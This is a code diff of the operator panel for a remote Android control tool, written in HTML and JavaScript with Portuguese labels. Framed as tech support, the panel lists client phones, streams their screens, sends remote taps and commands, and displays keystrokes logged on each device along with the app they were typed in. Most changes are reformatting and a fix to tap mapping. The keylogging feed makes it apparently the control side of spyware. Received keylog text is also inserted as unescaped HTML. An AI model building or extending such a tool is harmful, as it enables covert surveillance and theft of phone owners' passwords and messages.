@@ -24,15 +24,13 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
 .ctrl.warn:hover{background:#2d1f0a;color:#fbd38d}
 .center{display:flex;flex-direction:column;align-items:center;padding:12px 20px;gap:8px;overflow:auto}
-
-/* Device frame — tamanho automático baseado na resolução real */
-.device{background:#111827;border:3px solid #374151;border-radius:32px;position:relative;overflow:hidden;flex-shrink:0;box-shadow:0 0 0 1px #1f2937,0 20px 60px rgba(0,0,0,0.5)}
-.screen{width:100%;height:100%;background:#000;display:flex;align-items:stretch;justify-content:stretch;cursor:crosshair;position:relative;overflow:hidden}
-#stream-img{width:100%;height:100%;object-fit:fill;display:none;pointer-events:none}
+.device{background:#111827;border:3px solid #374151;border-radius:32px;position:relative;flex-shrink:0;box-shadow:0 0 0 1px #1f2937,0 20px 60px rgba(0,0,0,0.5);overflow:hidden}
+.screen{width:100%;height:100%;background:#000;cursor:crosshair;position:relative;overflow:hidden}
+/* A imagem ocupa exatamente o container — sem margens, sem object-fit contain */
+#stream-img{position:absolute;top:0;left:0;width:100%;height:100%;display:none;pointer-events:none}
 .screen-placeholder{text-align:center;color:#2d3748;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
 .screen-placeholder i{font-size:36px;display:block;margin-bottom:8px}
 .screen-placeholder p{font-size:11px}
-
 .nav-bar{display:flex;gap:6px;justify-content:center;flex-wrap:wrap}
 .nav-btn{padding:8px 14px;background:#1e2433;border:1px solid #2d3748;border-radius:10px;color:#a0aec0;cursor:pointer;font-size:11px;display:flex;align-items:center;gap:4px;flex-direction:column}
 .nav-btn:hover{background:#2d3748;color:#fff}
@@ -120,10 +118,9 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
       </div>
 
       <div class="center">
-        <!-- Visor maior e com cliques precisos -->
         <div class="device" id="device-wrap">
           <div class="screen" id="screen" onclick="handleToque(event)">
-            <img id="stream-img" alt="Tela do dispositivo">
+            <img id="stream-img" alt="">
             <div class="screen-placeholder" id="placeholder">
               <i class="ti ti-device-mobile"></i>
               <p>Aguardando stream...</p>
@@ -171,86 +168,80 @@ const SERVER = window.location.origin.replace(/^http/, 'ws');
 let ws = null, deviceAtual = null, streaming = false;
 let dispositivoLargura = 0, dispositivoAltura = 0;
 let abaAtual = 'log';
-
-// Tamanho do visor — calculado automaticamente pela proporção do celular
-const VISOR_W = 260; // largura base do visor em pixels
+const VISOR_W = 260;
 
 function mudarAba(aba){
   abaAtual = aba;
-  document.getElementById('painel-log').style.display = aba === 'log' ? 'block' : 'none';
-  document.getElementById('painel-key').style.display = aba === 'key' ? 'block' : 'none';
-  document.getElementById('tab-log').className = 'tab' + (aba==='log'?' active':'');
-  document.getElementById('tab-key').className = 'tab' + (aba==='key'?' active':'');
-  if(aba === 'key') document.getElementById('key-badge').style.display = 'none';
+  document.getElementById('painel-log').style.display = aba==='log'?'block':'none';
+  document.getElementById('painel-key').style.display = aba==='key'?'block':'none';
+  document.getElementById('tab-log').className='tab'+(aba==='log'?' active':'');
+  document.getElementById('tab-key').className='tab'+(aba==='key'?' active':'');
+  if(aba==='key') document.getElementById('key-badge').style.display='none';
 }
 
-function log(msg, tipo=''){
-  const el = document.getElementById('painel-log');
-  const d = document.createElement('div');
-  d.className = 'log-entry ' + tipo;
-  d.innerHTML = `<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
+function log(msg,tipo=''){
+  const el=document.getElementById('painel-log');
+  const d=document.createElement('div');
+  d.className='log-entry '+tipo;
+  d.innerHTML=`<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
   el.prepend(d);
 }
 
-function logKey(texto, app){
-  const el = document.getElementById('painel-key');
-  const d = document.createElement('div');
-  d.className = 'keylog-entry';
-  d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
+function logKey(texto,app){
+  const el=document.getElementById('painel-key');
+  const d=document.createElement('div');
+  d.className='keylog-entry';
+  d.innerHTML=`<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
   el.prepend(d);
-  if(abaAtual !== 'key') document.getElementById('key-badge').style.display = 'inline';
+  if(abaAtual!=='key') document.getElementById('key-badge').style.display='inline';
 }
 
 conectarTecnico();
 
 function conectarTecnico(){
-  ws = new WebSocket(`${SERVER}?papel=tecnico`);
-  ws.onopen = () => {
-    setStatus(true);
-    log('Painel conectado', 'ev');
-    if (deviceAtual) {
-      setTimeout(() => {
-        if (ws.readyState === WebSocket.OPEN) {
-          ws.send(JSON.stringify({ tipo: 'conectar_cliente', deviceToken: deviceAtual }));
-          log('Reconectando ao cliente anterior...', 'ev');
+  ws=new WebSocket(`${SERVER}?papel=tecnico`);
+  ws.onopen=()=>{
+    setStatus(true); log('Painel conectado','ev');
+    if(deviceAtual){
+      setTimeout(()=>{
+        if(ws.readyState===WebSocket.OPEN){
+          ws.send(JSON.stringify({tipo:'conectar_cliente',deviceToken:deviceAtual}));
+          log('Reconectando ao cliente anterior...','ev');
         }
-      }, 1000);
+      },1000);
     }
   };
-  ws.onmessage = (e) => {
-    const msg = JSON.parse(e.data);
+  ws.onmessage=(e)=>{
+    const msg=JSON.parse(e.data);
     switch(msg.tipo){
       case 'lista_clientes': renderizarClientes(msg.clientes); break;
       case 'sessao_iniciada':
-        deviceAtual = msg.deviceToken;
+        deviceAtual=msg.deviceToken;
         atualizarDispositivo(msg.info);
         abrirPainel();
-        log('Sessão iniciada', 'ev');
+        log('Sessão iniciada','ev');
         break;
-      case 'stream_iniciado':
-        iniciarStreamUI();
-        log('Stream ativo', 'ev');
-        break;
+      case 'stream_iniciado': iniciarStreamUI(); log('Stream ativo','ev'); break;
       case 'frame_tela': mostrarFrame(msg.frame); break;
-      case 'keylog': logKey(msg.texto, msg.app || 'desconhecido'); break;
-      case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
+      case 'keylog': logKey(msg.texto, msg.app||'desconhecido'); break;
+      case 'cliente_desconectou': log('Cliente desconectou','err'); break;
     }
   };
-  ws.onclose = () => { setStatus(false); setTimeout(conectarTecnico, 3000); };
+  ws.onclose=()=>{setStatus(false);setTimeout(conectarTecnico,3000);};
 }
 
 function renderizarClientes(clientes){
-  const el = document.getElementById('lista-clientes');
-  if(!clientes || clientes.length === 0){
-    el.innerHTML = '<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>';
+  const el=document.getElementById('lista-clientes');
+  if(!clientes||clientes.length===0){
+    el.innerHTML='<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>';
     return;
   }
-  el.innerHTML = clientes.map(c => `
+  el.innerHTML=clientes.map(c=>`
     <div class="cliente-card">
       <div class="cliente-info">
-        <strong>${c.info?.modelo || 'Dispositivo desconhecido'}</strong><br>
+        <strong>${c.info?.modelo||'Dispositivo desconhecido'}</strong><br>
         ${c.info?.android||''} &nbsp;|&nbsp; Bateria: ${c.info?.bateria||'—'} &nbsp;|&nbsp; ${c.info?.wifi||'—'}
-        ${c.emAtendimento ? ' &nbsp;<span style="color:#68d391">● Em atendimento</span>' : ''}
+        ${c.emAtendimento?' &nbsp;<span style="color:#68d391">● Em atendimento</span>':''}
       </div>
       <button class="btn-atender" onclick="atenderCliente('${c.deviceToken}')">
         <i class="ti ti-headset"></i> Atender
@@ -259,106 +250,110 @@ function renderizarClientes(clientes){
   `).join('');
 }
 
-function atenderCliente(token){ ws.send(JSON.stringify({ tipo:'conectar_cliente', deviceToken:token })); }
+function atenderCliente(token){ws.send(JSON.stringify({tipo:'conectar_cliente',deviceToken:token}));}
 
 function abrirPainel(){
-  document.getElementById('tela-clientes').style.display = 'none';
-  document.getElementById('tela-painel').style.display = 'flex';
-  document.getElementById('btn-voltar').style.display = 'block';
-  document.getElementById('session-id-top').textContent = `Token: ${deviceAtual}`;
+  document.getElementById('tela-clientes').style.display='none';
+  document.getElementById('tela-painel').style.display='flex';
+  document.getElementById('btn-voltar').style.display='block';
+  document.getElementById('session-id-top').textContent=`Token: ${deviceAtual}`;
 }
 
 function iniciarStreamUI(){
-  streaming = true;
-  document.getElementById('stream-icon').className = 'ti ti-player-pause';
-  document.getElementById('stream-label').textContent = 'Parar';
+  streaming=true;
+  document.getElementById('stream-icon').className='ti ti-player-pause';
+  document.getElementById('stream-label').textContent='Parar';
 }
 
 function voltarLista(){
-  deviceAtual = null; streaming = false;
-  document.getElementById('tela-painel').style.display = 'none';
-  document.getElementById('tela-clientes').style.display = 'flex';
-  document.getElementById('btn-voltar').style.display = 'none';
-  document.getElementById('stream-img').style.display = 'none';
-  document.getElementById('placeholder').style.display = 'flex';
-  document.getElementById('stream-icon').className = 'ti ti-player-play';
-  document.getElementById('stream-label').textContent = 'Stream';
+  deviceAtual=null; streaming=false;
+  document.getElementById('tela-painel').style.display='none';
+  document.getElementById('tela-clientes').style.display='flex';
+  document.getElementById('btn-voltar').style.display='none';
+  document.getElementById('stream-img').style.display='none';
+  document.getElementById('placeholder').style.display='flex';
+  document.getElementById('stream-icon').className='ti ti-player-play';
+  document.getElementById('stream-label').textContent='Stream';
 }
 
 function send(msg){
-  if(!ws || ws.readyState !== WebSocket.OPEN) return;
+  if(!ws||ws.readyState!==WebSocket.OPEN) return;
   ws.send(JSON.stringify(msg));
 }
 
-function sendCmd(cmd){ send({ tipo:'cmd', cmd }); log(`→ cmd ${cmd}`); }
-function solicitarCompartilhamento(){ send({ tipo:'cmd', cmd:'solicitar_tela' }); log('→ Pedindo tela...','warn'); }
+function sendCmd(cmd){send({tipo:'cmd',cmd});log(`→ cmd ${cmd}`);}
+function solicitarCompartilhamento(){send({tipo:'cmd',cmd:'solicitar_tela'});log('→ Pedindo tela...','warn');}
 
 function handleToque(e){
+  // Pega o rect do screen (container da imagem)
   const screen = document.getElementById('screen');
-  const img = document.getElementById('stream-img');
   const rect = screen.getBoundingClientRect();
 
-  // Clique em relação ao container
+  // Posição do clique dentro do container
   const clickX = e.clientX - rect.left;
   const clickY = e.clientY - rect.top;
 
-  // Como a imagem usa object-fit:fill, ocupa 100% do container
-  // Então o clique é direto em proporção
-  const xPct = (clickX / rect.width * 100).toFixed(4);
-  const yPct = (clickY / rect.height * 100).toFixed(4);
+  // Converte para porcentagem da tela do celular
+  // O container tem exatamente a proporção do celular, então é 1:1
+  const xPct = Math.max(0, Math.min(100, clickX / rect.width * 100));
+  const yPct = Math.max(0, Math.min(100, clickY / rect.height * 100));
 
-  send({ tipo:'toque', x:+xPct, y:+yPct, largura: dispositivoLargura||1080, altura: dispositivoAltura||2340 });
+  log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
+  send({tipo:'toque', x:+xPct.toFixed(4), y:+yPct.toFixed(4), largura:dispositivoLargura||1080, altura:dispositivoAltura||2340});
 }
 
 function enviarMensagem(){
-  const v = document.getElementById('msg-input').value.trim();
+  const v=document.getElementById('msg-input').value.trim();
   if(!v) return;
-  send({ tipo:'mensagem', texto:v });
-  log(`→ mensagem: ${v}`, 'ev');
-  document.getElementById('msg-input').value = '';
+  send({tipo:'mensagem',texto:v});
+  log(`→ mensagem: ${v}`,'ev');
+  document.getElementById('msg-input').value='';
 }
 
 function toggleStream(){
-  streaming = !streaming;
-  send({ tipo: streaming ? 'stream_start' : 'stream_stop' });
-  document.getElementById('stream-icon').className = streaming ? 'ti ti-player-pause' : 'ti ti-player-play';
-  document.getElementById('stream-label').textContent = streaming ? 'Parar' : 'Stream';
+  streaming=!streaming;
+  send({tipo:streaming?'stream_start':'stream_stop'});
+  document.getElementById('stream-icon').className=streaming?'ti ti-player-pause':'ti ti-player-play';
+  document.getElementById('stream-label').textContent=streaming?'Parar':'Stream';
 }
 
 function mostrarFrame(base64){
-  const img = document.getElementById('stream-img');
-  img.src = 'data:image/jpeg;base64,' + base64;
-  img.style.display = 'block';
-  document.getElementById('placeholder').style.display = 'none';
+  const img=document.getElementById('stream-img');
+  img.src='data:image/jpeg;base64,'+base64;
+  img.style.display='block';
+  document.getElementById('placeholder').style.display='none';
 }
 
 function atualizarDispositivo(info){
   if(!info) return;
-  document.getElementById('d-bat').textContent = info.bateria||'—';
-  document.getElementById('d-ram').textContent = info.ram||'—';
-  document.getElementById('d-wifi').textContent = info.wifi||'—';
-  document.getElementById('d-os').textContent = info.android||'—';
-  document.getElementById('d-model').textContent = info.modelo||'—';
-  if(info.largura && info.altura){
-    dispositivoLargura = parseInt(info.largura);
-    dispositivoAltura  = parseInt(info.altura);
-    document.getElementById('d-res').textContent = `${dispositivoLargura}×${dispositivoAltura}`;
+  document.getElementById('d-bat').textContent=info.bateria||'—';
+  document.getElementById('d-ram').textContent=info.ram||'—';
+  document.getElementById('d-wifi').textContent=info.wifi||'—';
+  document.getElementById('d-os').textContent=info.android||'—';
+  document.getElementById('d-model').textContent=info.modelo||'—';
+  if(info.largura&&info.altura){
+    dispositivoLargura=parseInt(info.largura);
+    dispositivoAltura=parseInt(info.altura);
+    document.getElementById('d-res').textContent=`${dispositivoLargura}×${dispositivoAltura}`;
 
-    // Calcula tamanho do visor respeitando a proporção real do celular
-    const ratio = dispositivoAltura / dispositivoLargura;
-    const w = VISOR_W;
-    const h = Math.round(w * ratio);
-    const wrap = document.getElementById('device-wrap');
-    wrap.style.width = w + 'px';
-    wrap.style.height = h + 'px';
+    // Visor com proporção exata do celular — sem margens internas
+    const ratio=dispositivoAltura/dispositivoLargura;
+    const w=VISOR_W;
+    const h=Math.round(w*ratio);
+    const wrap=document.getElementById('device-wrap');
+    const screen=document.getElementById('screen');
+    wrap.style.width=w+'px';
+    wrap.style.height=h+'px';
+    screen.style.width=w+'px';
+    screen.style.height=h+'px';
   }
 }
 
-function encerrar(){ send({tipo:'encerrar'}); voltarLista(); log('Sessão encerrada','err'); }
+function encerrar(){send({tipo:'encerrar'});voltarLista();log('Sessão encerrada','err');}
 function setStatus(online){
-  const b = document.getElementById('status-badge');
-  b.className = 'status ' + (online?'online':'offline');
-  b.innerHTML = `<span class="dot"></span> ${online?'Conectado':'Desconectado'}`;
+  const b=document.getElementById('status-badge');
+  b.className='status '+(online?'online':'offline');
+  b.innerHTML=`<span class="dot"></span> ${online?'Conectado':'Desconectado'}`;
 }
 </script>
 </body>
